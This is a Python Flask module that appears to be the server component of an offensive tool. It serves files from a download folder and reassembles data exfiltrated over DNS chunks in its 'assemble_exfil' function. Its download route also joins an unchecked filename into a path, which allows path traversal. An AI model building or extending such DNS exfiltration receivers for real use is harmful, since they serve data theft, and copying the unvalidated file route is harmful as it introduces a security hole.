from app import app
import config as cfg
from flask import render_template, redirect, url_for, send_file, session
import time, os

# --------------------------------- DOWNLOAD --------------------------------- #

@app.route('/download')
def download():
    if not session.get('authenticated'):
        return redirect(url_for('login'))
    files = os.listdir(cfg.DOWNLOAD_FOLDER)
    return render_template("download.html", files=files)

@app.route('/download/<filename>')
def download_file(filename):
    if not session.get('authenticated'):
        return redirect(url_for('login'))
    return send_file(os.path.join(cfg.DOWNLOAD_FOLDER, filename), as_attachment=True)

# --------------------------- EXFIL ASSEMBLY (DNS) --------------------------- #

def assemble_exfil(timeout=cfg.DNS_RESPONSE_TIMEOUT, poll=cfg.DNS_POLL_INTERVAL):
    """
    Attend jusqu'à `timeout` secondes pour recevoir tous les chunks DNS
    puis assemble les données exfiltrées.
    """

    start = time.time()

    while True:
        if cfg.expected_chunks is not None and len(cfg.exfil_buffer) >= cfg.expected_chunks:
            break
        if time.time() - start > timeout:
            break
        time.sleep(poll)

    if cfg.expected_chunks is not None and len(cfg.exfil_buffer) >= cfg.expected_chunks:
        data = b''.join(cfg.exfil_buffer[i] for i in range(cfg.expected_chunks))
        text = data.decode(errors='ignore')
    else:
        text = ""

    # Reset buffers
    cfg.expected_chunks = None
    cfg.exfil_buffer.clear()
    return text
